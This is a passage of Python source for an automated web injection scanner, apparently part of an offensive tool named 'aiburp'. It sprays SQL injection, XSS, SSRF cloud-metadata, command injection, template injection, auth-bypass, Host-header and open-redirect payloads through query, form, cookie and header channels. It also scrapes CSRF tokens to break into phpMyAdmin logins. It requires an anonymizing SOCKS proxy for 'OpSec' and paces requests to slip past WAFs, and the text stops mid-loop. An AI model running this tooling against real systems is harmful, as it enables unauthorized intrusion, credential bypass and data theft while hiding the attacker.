"""
多通道参数注入引擎 — 真正的主动发包测试.

解决三个历史缺口:
    1. 通道盲区: 旧工具只走 GET, cookie/header 静默无操作
    2. 无自动注入: 没有"给带参数 URL, 自动提取参数并注入"的能力
    3. 检测覆盖: error-based + reflection + time-based + IDOR + SSRF 元数据

设计原则:
    - 用 requests.Session (不走 AsyncBurp/httpx), 直接接受已配好代理的 session
      → OpSec 从源头保证, 不依赖调用方记得传 proxy
    - 六通道: GET query / POST body / Cookie 头 / 自定义 Header / Host 注入 / Method Override
    - payload 复用 aiburp.payloads 现有库 (SQLI/XSS/SSRF/CMDi/SSTI/LFI)
    - CSRF token 预抓取: 遇到表单自动提取 token, 支持 phpMyAdmin 等认证绕过

用法:
    import requests
    s = requests.Session()
    s.proxies = {'http': 'socks5h://...', 'https': 'socks5h://...'}  # 必须配代理

    inj = MultiChannelInjector(s)
    findings = inj.scan_all("http://target.com/page?id=1&name=test")
    # findings = [InjectionFinding(channel="GET", param="id", vuln_type="sqli", ...)]
"""

import re
import time
import json
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import List, Dict, Optional, Any
from dataclasses import dataclass, field


# ============================================================
#                   检测模式
# ============================================================

# SQL 错误 (复用 constants, 但本地化避免循环导入)
SQL_ERROR_PATTERNS = [
    r"SQL syntax.*MySQL", r"Warning.*mysql_", r"Warning.*mysqli_",
    r"You have an error in your SQL syntax", r"MySqlException",
    r"PostgreSQL.*ERROR", r"pg_query",
    r"Microsoft.*ODBC.*SQL Server", r"SQL Server.*error",
    r"ORA-\d{5}", r"Oracle error",
    r"SQLite.*Exception", r"sqlite3\.OperationalError",
    r"syntax error", r"unclosed quotation",
    r"ADODB\.Field", r"Microsoft JET Database",  # 经典 ASP SQL 错误
    r"Provider.*error", r"\[Microsoft\]\[",
    # .NET / ASP 异常 (store.aspx 实战: 500 + System.* 异常文本)
    r"System\.Data\.", r"SqlException", r"OleDbException",
    r"SqlClient\.Sql", r"CommandBehavior",
    r"Exception.*System\.", r"NullReferenceException",
    # PHP / 通用
    r"Warning.*mysql", r"Fatal error.*SQL", r"pg_exec",
    r"You have an error.*syntax",
]

# 应用异常信号 (500 错误 + 异常文本 = 可能有注入, 需人工确认)
APP_EXCEPTION_SIGNALS = [
    r"System\.", r"Exception", r"Stack Trace", r"Runtime Error",
    r"Server Error", r"详细错误", r"编译错误",
    r"Object reference not set", r"Index was outside",
]

# XSS 反射检测 (payload 里的标记)
XSS_CANARY = "xsscanary"
XSS_REFLECTION_PATTERNS = [
    r"xsscanary",           # 标记直接反射
    r"<script[^>]*>xsscanary",
    r"alert\(\s*xsscanary",
    r"onerror\s*=\s*['\"]?[^'\"]*xsscanary",
]

# SSRF 元数据命中
SSRF_HIT_PATTERNS = [
    r"ami-id", r"instance-id", r"security-credentials",
    r"computeMetadata", r"subscription-id", r"vmId",
    r"amiId", r"availability-zone",
    r"root:.*:0:0:",       # /etc/passwd via file://
    r"\[fonts\]",          # win.ini via file://
]

# SSTI 命中 (7*7=49 等)
SSTI_HIT_PATTERNS = {
    "49": r"\b49\b",  # {{7*7}}
    "7777777": r"7777777",  # ${7*7}7 → java
}

# IDOR 信号
IDOR_STATUS_CODES = {200}  # 从 401/403 → 200 = 越权


# ============================================================
#                   数据结构
# ============================================================

@dataclass
class InjectionFinding:
    """单个注入发现"""
    channel: str          # "GET" / "POST" / "COOKIE" / "HEADER"
    param: str            # 参数名
    vuln_type: str        # sqli / xss / ssrf / cmdi / ssti / lfi / idor / auth-bypass
    payload: str          # 命中的 payload
    evidence: str         # 证据 (错误信息片段/反射位置/延迟毫秒)
    confidence: str = "probable"  # confirmed / probable
    request_url: str = ""  # 实际请求的 URL
    response_snippet: str = ""  # 响应片段

    def to_dict(self) -> dict:
        return {
            "channel": self.channel, "param": self.param,
            "vuln_type": self.vuln_type, "payload": self.payload[:60],
            "evidence": self.evidence[:100], "confidence": self.confidence,
        }


@dataclass
class ScanReport:
    """注入扫描报告"""
    url: str
    total_requests: int = 0
    findings: List[InjectionFinding] = field(default_factory=list)
    params_scanned: Dict[str, List[str]] = field(default_factory=dict)  # {"GET": ["id","name"], ...}
    baseline_status: int = 0
    baseline_length: int = 0
    errors: List[str] = field(default_factory=list)

    @property
    def critical_count(self) -> int:
        return sum(1 for f in self.findings if f.vuln_type in ("sqli", "cmdi", "ssti", "ssrf"))

    def summary(self) -> str:
        by_type = {}
        for f in self.findings:
            by_type[f.vuln_type] = by_type.get(f.vuln_type, 0) + 1
        types_str = ", ".join(f"{k}:{v}" for k, v in by_type.items()) or "无"
        return (f"url={self.url} 请求={self.total_requests} 发现={len(self.findings)} "
                f"({types_str}) 参数={self.params_scanned}")


# ============================================================
#                   多通道注入引擎
# ============================================================

class MultiChannelInjector:
    """
    多通道参数注入引擎.

    给一个带参数的 URL, 自动:
        1. 提取所有参数 (GET query + 表单 + cookie)
        2. 对每个参数 × 每个通道 × 每种漏洞 发 payload
        3. 检测 error-based / reflection / time-based / IDOR / SSRF

    必须传入已配好代理的 session (OpSec 强制).
    """

    # 默认扫描的漏洞类型
    DEFAULT_TYPES = ["sqli", "xss", "idor"]
    # 默认扫描的通道
    DEFAULT_CHANNELS = ["GET", "POST", "COOKIE", "HEADER", "HOST_INJECT", "METHOD_OVERRIDE"]

    # ============================================================
    # CSRF Token 预抓取 (支持 phpMyAdmin / 登录表单等)
    # ============================================================

    # CSRF token 在表单中的常见字段名
    CSRF_TOKEN_NAMES = [
        'token', 'csrf', 'csrf_token', 'csrf-token', '_token',
        'nonce', '_wpnonce', 'authenticity_token',
        'xsrf', '_csrf', 'csrfmiddlewaretoken',
        'set_session', 'server',  # phpMyAdmin
        '__RequestVerificationToken',  # ASP.NET
        'form_token', 'formtoken', 'sectoken',
    ]

    # CSRF token 值的常见 regex 模式
    CSRF_VALUE_PATTERNS = [
        r'name="token"\s+value="([^"]+)"',         # phpMyAdmin
        r'name="set_session"\s+value="([^"]+)"',    # phpMyAdmin
        r'name="([^"]*csrf[^"]*)"\s+value="([^"]+)"',
        r'name="([^"]*token[^"]*)"\s+value="([^"]+)"',
        r'name="([^"]*nonce[^"]*)"\s+value="([^"]+)"',
        r'<meta\s+name="csrf[^"]*"\s+content="([^"]+)"',
        r'name="__RequestVerificationToken"\s+.*?value="([^"]+)"',
    ]

    def _fetch_csrf_tokens(self, url: str) -> Dict[str, str]:
        """
        预抓取目标页面的 CSRF token.

        对 phpMyAdmin / 登录表单等场景, 先 GET 页面, 提取 token 字段,
        再注入到后续 POST 请求中.

        Returns:
            {"token": "abc123", "set_session": "def456", ...}
        """
        tokens = {}
        try:
            r = self.session.get(url, timeout=self.timeout, allow_redirects=True)
            body = r.text
            # 1. 用通用模式抓
            for pat in self.CSRF_VALUE_PATTERNS:
                for m in re.finditer(pat, body, re.I):
                    groups = m.groups()
                    if len(groups) == 2:
                        # 带 name 捕获组的模式: name=groups[0], value=groups[1]
                        tokens[groups[0].lower()] = groups[1]
                    elif len(groups) == 1:
                        # 只有 value 的模式: 从上下文推断 name
                        inferred = self._infer_token_name(m)
                        tokens[inferred.lower()] = groups[0]
            # 2. phpMyAdmin 特殊处理: 也抓 server 和 lang
            if 'phpmyadmin' in body.lower() or 'pma_' in body:
                for field in ['server', 'lang', 'token', 'set_session']:
                    m = re.search(rf'name="{field}"\s+value="([^"]+)"', body, re.I)
                    if m and field not in tokens:
                        tokens[field] = m.group(1)
            # 3. 从 hidden input 里补抓其他 token 字段
            for hidden_m in re.finditer(r'<input[^>]*type=["\']hidden["\'][^>]*>', body, re.I):
                tag = hidden_m.group(0)
                name_m = re.search(r'name=["\']([^"\']+)["\']', tag, re.I)
                value_m = re.search(r'value=["\']([^"\']*)["\']', tag, re.I)
                if name_m and value_m:
                    name = name_m.group(1).lower()
                    if any(kw in name for kw in self.CSRF_TOKEN_NAMES) and name not in tokens:
                        tokens[name] = value_m.group(1)
        except Exception:
            pass
        return tokens

    @staticmethod
    def _infer_token_name(match) -> str:
        """从匹配文本推断 token 字段名."""
        text = match.group(0).lower()
        for name in ['token', 'csrf', 'nonce', '_token']:
            if name in text:
                return name
        return 'token'

    def __init__(self, session, timeout: float = 8.0, delay: float = 0.3,
                 journal: "TrafficJournal" = None):
        """
        Args:
            session: 已配好代理的 requests.Session (OpSec)
            timeout: 单个请求超时
            delay: 请求间延迟 (避免触发 WAF)
            journal: 可选的 TrafficJournal, 所有请求自动记录
        """
        self.session = session
        self.timeout = timeout
        self.delay = delay
        self.journal = journal
        self._baseline = None
        self._baseline_time = 0
        self._baseline_status = 0
        self._baseline_length = 0

    # ============================================================
    # 参数提取
    # ============================================================

    def extract_params(self, url: str, baseline_response=None) -> Dict[str, List[str]]:
        """
        从 URL + 基线响应提取所有参数.

        三源:
            - GET: URL query string 里的参数
            - POST: 基线响应 HTML 里的 <form> 表单字段
            - COOKIE: session 里已有的 cookie 名

        Returns:
            {"GET": ["id", "name"], "POST": ["username"], "COOKIE": ["sessionid"]}
        """
        result = {"GET": [], "POST": [], "COOKIE": [], "HEADER": []}

        # 1. GET query 参数
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        result["GET"] = list(qs.keys())

        # 2. POST 表单字段 (从基线响应 HTML 提取)
        if baseline_response is not None:
            body = ""
            try:
                body = baseline_response.text[:20000]
            except Exception:
                pass
            # 表单里的 input/select/textarea name
            form_fields = set()
            for pat in [r'<input[^>]*name=["\']([^"\']+)["\']',
                        r'<select[^>]*name=["\']([^"\']+)["\']',
                        r'<textarea[^>]*name=["\']([^"\']+)["\']']:
                form_fields.update(re.findall(pat, body, re.I))
            # 过滤掉 ASP.NET 系统字段 (不是注入目标)
            system_fields = {'__VIEWSTATE', '__EVENTVALIDATION', '__VIEWSTATEGENERATOR',
                             '__EVENTTARGET', '__EVENTARGUMENT'}
            result["POST"] = [f for f in form_fields if f not in system_fields]

        # 3. COOKIE 参数
        try:
            result["COOKIE"] = list(self.session.cookies.keys())
        except Exception:
            pass

        # 4. 始终测试的高价值 Header
        result["HEADER"] = ["X-Forwarded-For", "Referer", "Host"]

        # 5. Host 注入固定参数
        result["HOST_INJECT"] = ["Host"]

        # 6. Method Override 固定参数
        result["METHOD_OVERRIDE"] = ["X-HTTP-Method-Override", "X-Method-Override", "_method"]

        return result

    # ============================================================
    # 单通道注入
    # ============================================================

    def _send_payload(self, url: str, channel: str, param: str,
                      payload: str, method: str = "GET", base_params: dict = None,
                      base_cookies: dict = None) -> Optional[dict]:
        """
        对单个参数+单个通道发一个 payload, 返回响应信息.

        channel 决定 payload 放哪:
            GET    → URL query string
            POST   → 请求 body (form)
            COOKIE → Cookie 头
            HEADER → 自定义 Header (param 作为 header 名)
        """
        base_params = base_params or {}
        base_cookies = base_cookies or {}

        try:
            if channel == "GET":
                # 把 payload 注入到 GET query 的指定参数
                params = dict(base_params)
                params[param] = payload
                r = self.session.get(url, params=params, timeout=self.timeout,
                                     allow_redirects=False)

            elif channel == "POST":
                # POST body 注入
                data = dict(base_params)
                data[param] = payload
                r = self.session.post(url, data=data, timeout=self.timeout,
                                      allow_redirects=False)

            elif channel == "COOKIE":
                # Cookie 头注入
                cookies = dict(base_cookies)
                cookies[param] = payload
                r = self.session.get(url, cookies=cookies, timeout=self.timeout,
                                     allow_redirects=False)

            elif channel == "HEADER":
                # Header 注入 (param 是 header 名, payload 是 header 值)
                headers = {param: payload}
                r = self.session.get(url, headers=headers, timeout=self.timeout,
                                     allow_redirects=False)

            elif channel == "HOST_INJECT":
                # Host 头注入 — 用 Host 和 X-Forwarded-Host 两个头
                # 测试: 1) 恶意 Host 2) 127.0.0.1 3) 内网地址
                headers = {param: payload}
                if param == "Host":
                    headers["X-Forwarded-Host"] = payload
                r = self.session.get(url, headers=headers, timeout=self.timeout,
                                     allow_redirects=False)

            elif channel == "METHOD_OVERRIDE":
                # HTTP 方法覆盖 — 通过头或参数覆盖真实方法
                # 测试: X-HTTP-Method-Override / X-Method-Override / _method 参数
                if param in ("X-HTTP-Method-Override", "X-Method-Override"):
                    headers = {param: payload}
                    if "GET" in str(self.session.headers.get("User-Agent", "")):
                        r = self.session.post(url, headers=headers, timeout=self.timeout,
                                             allow_redirects=False)
                    else:
                        r = self.session.get(url, headers=headers, timeout=self.timeout,
                                            allow_redirects=False)
                elif param == "_method":
                    # _method 参数放在 POST body 里
                    r = self.session.post(url, data={"_method": payload},
                                         timeout=self.timeout, allow_redirects=False)
                else:
                    return None
            else:
                return None

            return {
                "status": r.status_code,
                "length": len(r.text),
                "body": r.text[:15000],
                "headers": dict(r.headers),
                "url": str(r.url),
            }
        except Exception as e:
            return {"error": f"{type(e).__name__}: {str(e)[:80]}", "status": 0,
                    "length": 0, "body": "", "headers": {}, "url": ""}

    # ============================================================
    # 检测逻辑
    # ============================================================

    def _detect_sqli(self, resp: dict, payload: str) -> Optional[str]:
        """检测 SQL 注入 (error-based + 应用异常)."""
        if resp.get("error"):
            return None
        body = resp.get("body", "")
        status = resp.get("status", 0)
        # 1. 标准 SQL 错误
        for pat in SQL_ERROR_PATTERNS:
            m = re.search(pat, body, re.I)
            if m:
                return f"SQL错误: {m.group(0)[:50]}"
        # 2. 应用异常 (500 + 异常文本) — store.aspx 实战发现
        if status >= 500:
            for pat in APP_EXCEPTION_SIGNALS:
                m = re.search(pat, body, re.I)
                if m:
                    return f"服务端异常(500): {m.group(0)[:40]} (可能有注入)"
        return None

    def _detect_sqli_boolean(self, resp_true: dict, resp_false: dict,
                             param: str) -> Optional[str]:
        """
        Boolean-based SQLi 检测.

        原理: AND 1=1 (真) 应该返回和基线相似的响应,
              AND 1=2 (假) 应该返回不同的响应.
        如果 真≠假 但 真≈基线 → SQL 注入确认.
        """
        if resp_true.get("error") or resp_false.get("error"):
            return None
        len_true = resp_true.get("length", 0)
        len_false = resp_false.get("length", 0)
        len_base = self._baseline_length
        status_true = resp_true.get("status", 0)
        status_false = resp_false.get("status", 0)

        # 真 ≈ 基线 (差异小), 假 ≠ 基线 (差异大) → 注入确认
        if (abs(len_true - len_base) < 50          # 真≈基线
                and abs(len_false - len_base) > 200  # 假≠基线
                and abs(len_true - len_false) > 150):  # 真≠假
            return (f"Boolean SQLi: AND 1=1({len_true}b)≈基线({len_base}b), "
                    f"AND 1=2({len_false}b)差异大")
        # 状态码差异: 真=200 假=404/500
        if status_true == 200 and status_false in (404, 500) and len_true > 100:
            return (f"Boolean SQLi: AND 1=1→{status_true}, AND 1=2→{status_false} "
                    f"(状态码差异)")
        return None

    def _detect_sqli_time(self, resp: dict, elapsed: float, payload: str) -> Optional[str]:
        """检测 SQL 时间盲注."""
        if self._baseline_time <= 0:
            return None
        # SLEEP/WAITFOR/BENCHMARK payload 且延迟显著大于基线
        if any(kw in payload.upper() for kw in ["SLEEP", "WAITFOR", "BENCHMARK", "PG_SLEEP"]):
            if elapsed > self._baseline_time + 2.5:  # 2.5 秒阈值
                return f"时间盲注: 延迟{elapsed:.1f}s (基线{self._baseline_time:.1f}s)"
        return None

    def _detect_xss(self, resp: dict, payload: str) -> Optional[str]:
        """检测 XSS 反射."""
        if resp.get("error"):
            return None
        body = resp.get("body", "")
        # 检查 payload 的标记是否反射 (未经编码)
        if XSS_CANARY in payload:
            # 找标记在响应里的位置
            idx = body.find(XSS_CANARY)
            if idx >= 0:
                context = body[max(0, idx - 20):idx + len(XSS_CANARY) + 20]
                return f"XSS反射: ...{context}..."
        # 或者 payload 核心直接出现
        elif payload and len(payload) > 5:
            if payload in body:
                return f"payload直接反射: {payload[:40]}"
        return None

    def _detect_ssrf(self, resp: dict, payload: str) -> Optional[str]:
        """检测 SSRF (元数据/文件读取命中)."""
        if resp.get("error"):
            return None
        body = resp.get("body", "")
        for pat in SSRF_HIT_PATTERNS:
            m = re.search(pat, body, re.I)
            if m:
                return f"SSRF命中: {m.group(0)[:50]} (payload: {payload[:40]})"
        return None

    def _detect_cmdi(self, resp: dict, payload: str) -> Optional[str]:
        """检测命令注入 (复用 SSRF 元数据特征 + 5xx + 异常文本)."""
        if resp.get("error"):
            return None
        body = resp.get("body", "")
        status = resp.get("status", 0)
        # 1. 直接命中命令结果
        for pat in SSRF_HIT_PATTERNS:
            if re.search(pat, body, re.I):
                return f"CMDi命中: {pat[:30]} (payload: {payload[:40]})"
        # 2. 5xx + 异常文本
        if status >= 500:
            for pat in APP_EXCEPTION_SIGNALS:
                m = re.search(pat, body, re.I)
                if m:
                    return f"CMDi服务端异常(500): {m.group(0)[:40]}"
        # 3. payload 含 ; & | && || 等串联符号且响应时间显著 → 留给 time 检测
        return None

    def _detect_ssti(self, resp: dict, payload: str) -> Optional[str]:
        """检测 SSTI ({{7*7}}→49 等)."""
        if resp.get("error"):
            return None
        body = resp.get("body", "")
        for expected, pat in SSTI_HIT_PATTERNS.items():
            if expected in payload or "7*7" in payload or "49" in payload:
                if re.search(pat, body) and "7*7" in payload:
                    return f"SSTI命中: {payload[:30]} → {expected}"
        return None

    def _detect_idor(self, resp: dict, param: str, original_value: str) -> Optional[str]:
        """检测 IDOR (状态码 401/403→200 或响应差异)."""
        if resp.get("error"):
            return None
        status = resp.get("status", 0)
        length = resp.get("length", 0)
        # 基线是 401/403, 改参数后变 200 = 越权
        if self._baseline_status in (401, 403) and status == 200:
            return f"IDOR: {self._baseline_status}→200 (基线拒绝, 改值后通过)"
        # 基线 200, 改值后仍 200 但长度差异大 = 可能返回了不同数据
        if (self._baseline_status == 200 and status == 200
                and abs(length - self._baseline_length) > 200
                and length > 100):
            return (f"IDOR可能: 响应长度差异 {self._baseline_length}→{length} "
                    f"(可能返回不同数据)")
        return None

    def _detect_auth_bypass(self, resp: dict, payload: str) -> Optional[str]:
        """检测认证绕过 (SQLi auth bypass payload → 登录成功)."""
        if resp.get("error"):
            return None
        status = resp.get("status", 0)
        body = resp.get("body", "")
        # 302 重定向到 dashboard/admin = 登录成功
        if status in (301, 302):
            loc = resp.get("headers", {}).get("Location", "")
            if any(k in loc.lower() for k in ["dashboard", "admin", "home", "welcome"]):
                return f"认证绕过: 302→{loc[:40]}"
        # 200 + 登录成功关键词
        if status == 200:
            if any(k in body.lower()[:2000] for k in ["welcome", "logout", "dashboard",
                                                        "my account", "sign out"]):
                if "login" not in body.lower()[:500]:  # 排除登录页本身
                    return "认证绕过: 响应含登录后关键词"
        return None

    def _detect_host_injection(self, resp: dict, injected_host: str) -> Optional[str]:
        """检测 Host 头注入 (缓存投毒 / 密码重置投毒)."""
        if resp.get("error"):
            return None
        body = resp.get("body", "")
        headers = resp.get("headers", {})
        loc = headers.get("Location", "")
        # 1. 302 重定向到注入的 Host — 最高优先级 (开放重定向+Host注入)
        if injected_host in loc:
            return f"Host注入: 重定向到 {loc[:50]} → 开放重定向+Host注入"
        # 2. 注入的 Host 出现在响应体中 = 服务器信任了 Host 头
        if injected_host in body:
            return f"Host注入: {injected_host} 出现在响应体中 → 缓存投毒/密码重置投毒可能"
        # 3. 注入的 Host 出现在其他响应头中
        if injected_host in str(headers):
            return f"Host注入: {injected_host} 出现在响应头中"
        return None

    def _detect_method_override(self, resp: dict, method: str) -> Optional[str]:
        """检测 HTTP 方法覆盖 (绕过认证/ACL)."""
        if resp.get("error"):
            return None
        status = resp.get("status", 0)
        base_status = self._baseline_status
        # 0. 最高优先级: 基线 401/403, 方法覆盖后变 200 = 认证绕过
        if base_status in (401, 403) and status == 200:
            return (f"方法覆盖认证绕过: {method} → 200 "
                    f"(基线 {base_status}) → 认证绕过!")
        # 1. 一般状态码变化 (排除 405/501 方法不允许)
        if base_status != 0 and status != base_status:
            if status not in (405, 501):
                return (f"方法覆盖生效: {method} → {status} "
                        f"(基线 {base_status}) → 可能绕过ACL")
        return None

    def _detect_idor_path(self, resp: dict, original_url: str, modified_url: str) -> Optional[str]:
        """
        路径型 IDOR 检测 (针对 /catalog/product/123 → /catalog/product/0 等).

        复用 _detect_idor 的状态码/长度逻辑, 但额外检查:
            - 基线 200 改值仍 200 且长度差异显著
            - 基线 401/403 改值变 200
            - 路径不存在 (404) vs 路径存在 (200)
        """
        if resp.get("error"):
            return None
        status = resp.get("status", 0)
        length = resp.get("length", 0)
        # 基线拒绝 → 改路径后通过
        if self._baseline_status in (401, 403) and status == 200:
            return (f"路径IDOR: {self._baseline_status}→200 "
                    f"({original_url[-40:]} → {modified_url[-40:]})")
        # 基线 200, 改路径后仍 200 但长度差异大 = 可能返回其他用户资源
        if (self._baseline_status == 200 and status == 200
                and abs(length - self._baseline_length) > 200
                and length > 100):
            return (f"路径IDOR可能: 响应长度 {self._baseline_length}→{length} "
                    f"({original_url[-40:]} → {modified_url[-40:]})")
        # 基线 404, 改路径后变 200 = 绕过访问控制
        if self._baseline_status == 404 and status == 200:
            return (f"路径IDOR绕过: 404→200 "
                    f"({original_url[-40:]} → {modified_url[-40:]})")
        return None

    def _detect_redirect(self, resp: dict, payload: str) -> Optional[str]:
        """
        开放重定向检测.

        标志:
            - 状态码 301/302/303/307/308 且 Location 指向外部域
            - 状态码 200 且 body 内含 meta refresh / JS location.href 跳转到 payload 域
            - payload 域出现在最终 URL
        """
        if resp.get("error"):
            return None
        status = resp.get("status", 0)
        body = resp.get("body", "")
        headers = resp.get("headers", {})
        location = headers.get("Location", "") or headers.get("location", "")
        final_url = resp.get("url", "")

        # 1. 30x 重定向到外部域
        if status in (301, 302, 303, 307, 308) and location:
            # 提取 payload 中的域 (常见跳转 payload: //evil.com, https://evil.com, evil.com)
            payload_domains = self._extract_domains(payload)
            for d in payload_domains:
                if d and (d in location.lower() or d in final_url.lower()):
                    return (f"开放重定向: 30x→{location[:60]} "
                            f"(payload 域 {d} 命中)")
        # 2. meta refresh / JS 跳转
        if status == 200 and payload:
            payload_domains = self._extract_domains(payload)
            for d in payload_domains:
                if d and d in body.lower():
                    return (f"开放重定向: meta/JS 跳转到 {d} "
                            f"(payload 域命中 body)")
        return None

    @staticmethod
    def _extract_domains(s: str) -> List[str]:
        """从字符串里抽取域 (简单版)."""
        if not s:
            return []
        out = []
        # 匹配 //evil.com, https://evil.com, http://evil.com
        for m in re.finditer(r'(?:https?:)?//([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', s):
            out.append(m.group(1).lower())
        # 也匹配裸 evil.com (不是 URL 但常见跳转参数)
        for m in re.finditer(r'\b([a-zA-Z0-9-]+\.(?:com|net|org|io|xyz|tk|ml|ga|cf|me|co|us|uk|cn|ru|top|club|info|biz|ws))\b', s):
            out.append(m.group(1).lower())
        return list(set(out))

    # ============================================================
    # payload 选择
    # ============================================================

    def _get_payloads(self, vuln_type: str) -> List[str]:
        """根据漏洞类型选 payload (复用 aiburp.payloads)."""
        try:
            if vuln_type == "sqli":
                from ..payloads import SQLI
                # detection (单引号探测) + error_based + union + auth_bypass
                return SQLI.detection[:4] + SQLI.error_based[:3] + SQLI.union[:3]
            elif vuln_type == "xss":
                from ..payloads import XSS
                # basic + 带 canary 的
                basic = XSS.basic[:5] if hasattr(XSS, 'basic') else XSS.quick[:5]
                # 注入 canary 标记到 payload 里方便检测
                return [p.replace("<script>", f"<script>{XSS_CANARY}")
                         if "<script>" in p else p + XSS_CANARY
                         for p in basic] + [f"<script>{XSS_CANARY}</script>",
                                            f"\">{XSS_CANARY}</script>"]
            elif vuln_type == "ssrf":
                from ..payloads import SSRF
                return SSRF.cloud_metadata[:4] + SSRF.internal[:2]
            elif vuln_type == "cmdi":
                from ..payloads import CMDi
                return CMDi.quick[:4]
            elif vuln_type == "ssti":
                from ..payloads import SSTI
                return SSTI.detection[:5] if hasattr(SSTI, 'detection') else SSTI.quick[:5]
            elif vuln_type == "lfi":
                from ..payloads import LFI
                return LFI.quick[:4]
            elif vuln_type == "auth-bypass":
                from ..payloads import SQLI
                return SQLI.auth_bypass[:6]
            elif vuln_type == "idor":
                # IDOR 不发 payload, 而是改参数值
                return ["__IDOR_INCREMENT__", "__IDOR_DECREMENT__",
                        "__IDOR_ZERO__", "__IDOR_OTHER__"]
            elif vuln_type == "idor-path":
                # 路径型 IDOR: 直接调 scan_path_idor, 不发 payload
                return ["__IDOR_PATH_PROBE__"]
            elif vuln_type == "host-inject":
                # Host 头注入 payload
                return ["evil.attacker.com", "127.0.0.1", "localhost",
                        "169.254.169.254", "internal.admin"]
            elif vuln_type == "method-override":
                # HTTP 方法覆盖 payload
                return ["PUT", "DELETE", "PATCH", "OPTIONS"]
            elif vuln_type == "redirect":
                # 开放重定向 payload (在 GET query / POST body 参数里塞跳转域)
                return [
                    "https://evil.com",
                    "//evil.com",
                    "https://attacker.example.com",
                    "//attacker.example.com",
                    "/\\evil.com",
                    "https://google.com",
                ]
        except Exception:
            pass
        # fallback 内置最小 payload
        fallbacks = {
            "sqli": ["'", "\"", "' OR '1'='1", "' UNION SELECT NULL--"],
            "xss": [f"<script>{XSS_CANARY}</script>", f"\">{XSS_CANARY}</script>"],
            "ssrf": ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1"],
            "idor": ["__IDOR_INCREMENT__", "__IDOR_DECREMENT__"],
            "auth-bypass": ["' OR '1'='1'--", "admin'--", "' OR 1=1#"],
            "host-inject": ["evil.attacker.com", "127.0.0.1"],
            "method-override": ["PUT", "DELETE"],
        }
        return fallbacks.get(vuln_type, [])

    def _idor_value(self, original: str, mode: str) -> str:
        """生成 IDOR 测试值."""
        if original.isdigit():
            n = int(original)
            if mode == "__IDOR_INCREMENT__":
                return str(n + 1)
            elif mode == "__IDOR_DECREMENT__":
                return str(max(0, n - 1))
            elif mode == "__IDOR_ZERO__":
                return "0"
            elif mode == "__IDOR_OTHER__":
                return str(n + 100)
        # 非数字: 用常见值
        return {"__IDOR_INCREMENT__": "1", "__IDOR_DECREMENT__": "0",
                "__IDOR_ZERO__": "0", "__IDOR_OTHER__": "admin"}.get(mode, "1")

    # ============================================================
    # 全自动扫描
    # ============================================================

    def scan_all(self, url: str, vuln_types: List[str] = None,
                 channels: List[str] = None, custom_params: dict = None) -> ScanReport:
        """
        全自动: 提取参数 → 对每个参数×通道×漏洞发 payload → 检测.

        Args:
            url: 目标 URL (可带 query)
            vuln_types: 要测的漏洞类型 (默认 sqli/xss/idor)
            channels: 要测的通道 (默认 GET/POST/COOKIE/HEADER)
            custom_params: 自定义参数覆盖 ({"GET": {"id": "1"}})

        Returns:
            ScanReport
        """
        vuln_types = vuln_types or self.DEFAULT_TYPES
        channels = channels or self.DEFAULT_CHANNELS
        custom_params = custom_params or {}

        report = ScanReport(url=url)
        findings = []

        # 1. 获取基线响应
        try:
            t0 = time.time()
            self._baseline = self.session.get(url, timeout=self.timeout,
                                               allow_redirects=True)
            self._baseline_time = time.time() - t0
            self._baseline_status = self._baseline.status_code
            self._baseline_length = len(self._baseline.text)
            report.baseline_status = self._baseline_status
            report.baseline_length = self._baseline_length
        except Exception as e:
            report.errors.append(f"基线请求失败: {type(e).__name__}: {str(e)[:60]}")
            return report

        # 2. 提取参数
        params_map = self.extract_params(url, self._baseline)
        # 合并自定义参数
        for ch, pdict in custom_params.items():
            if isinstance(pdict, dict):
                for k in pdict:
                    if k not in params_map.get(ch, []):
                        params_map[ch] = params_map.get(ch, []) + [k]
        report.params_scanned = {ch: ps for ch, ps in params_map.items() if ps}

        # 基线参数值 (用于 IDOR 和保持其他参数不变)
        parsed = urlparse(url)
        base_get_params = parse_qs(parsed.query)
        base_get_params = {k: v[0] if v else "" for k, v in base_get_params.items()}
        base_cookies = {}
        try:
            base_cookies = dict(self.session.cookies)
        except Exception:
            pass

        # CSRF token 预抓取 (用于 auth-bypass 通道)
        # 对包含表单的目标 (如 phpMyAdmin / 登录页), 先抓 token
        csrf_tokens = {}
        if "auth-bypass" in vuln_types:
            csrf_tokens = self._fetch_csrf_tokens(url)

        # 3. 对每个通道×参数×漏洞类型发 payload
        for channel in channels:
            ch_params = params_map.get(channel, [])
            if not ch_params:
                continue

            for param in ch_params[:8]:  # 每通道最多 8 个参数
                original_value = base_get_params.get(param, "1")

                for vuln_type in vuln_types:
                    payloads = self._get_payloads(vuln_type)
                    for payload in payloads:
                        # IDOR 特殊处理: 改值而非注入 payload
                        if vuln_type == "idor":
                            actual_payload = self._idor_value(original_value, payload)
                        else:
                            actual_payload = payload

                        report.total_requests += 1

                        # 发请求并计时
                        t0 = time.time()
                        resp = self._send_payload(
                            url, channel, param, actual_payload,
                            base_params=base_get_params,
                            base_cookies=base_cookies,
                        )
                        elapsed = time.time() - t0

                        if resp is None or resp.get("error"):
                            continue

                        # 检测
                        evidence = None
                        confidence = "probable"

                        if vuln_type == "sqli":
                            evidence = self._detect_sqli(resp, actual_payload)
                            if not evidence:
                                evidence = self._detect_sqli_time(resp, elapsed, actual_payload)
                            if evidence:
                                confidence = "confirmed" if "SQL错误" in evidence else "probable"

                        elif vuln_type == "xss":
                            evidence = self._detect_xss(resp, actual_payload)

                        elif vuln_type == "ssrf":
                            evidence = self._detect_ssrf(resp, actual_payload)
                            if evidence:
                                confidence = "confirmed"

                        elif vuln_type == "ssti":
                            evidence = self._detect_ssti(resp, actual_payload)

                        elif vuln_type == "idor":
                            evidence = self._detect_idor(resp, param, original_value)

                        elif vuln_type == "auth-bypass":
                            evidence = self._detect_auth_bypass(resp, actual_payload)
                            if evidence:
                                confidence = "confirmed"

                        elif vuln_type == "host-inject":
                            evidence = self._detect_host_injection(resp, actual_payload)
                            if evidence:
                                confidence = "confirmed"

                        elif vuln_type == "method-override":
                            evidence = self._detect_method_override(resp, actual_payload)
                            if evidence:
                                confidence = "confirmed"

                        elif vuln_type == "cmdi":
                            # 命令注入检测: 复用 SSRF 元数据模式 + 简单的延迟/错误检测
                            evidence = self._detect_cmdi(resp, actual_payload)
                        elif vuln_type == "lfi":
                            # LFI 检测: 复用 SSRF 元数据 + 文件特征
